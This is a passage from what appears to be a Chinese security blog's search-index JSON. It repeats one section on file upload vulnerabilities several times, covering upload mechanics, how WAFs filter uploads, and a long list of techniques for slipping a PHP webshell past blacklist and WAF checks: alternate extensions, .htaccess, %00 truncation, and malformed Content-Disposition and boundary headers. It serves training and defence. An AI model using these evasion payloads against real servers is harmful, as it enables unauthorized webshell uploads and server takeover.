name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3攻击特征"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4需满足条件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5数据包中可修改的地方"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6waf如何拦截恶意文件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: 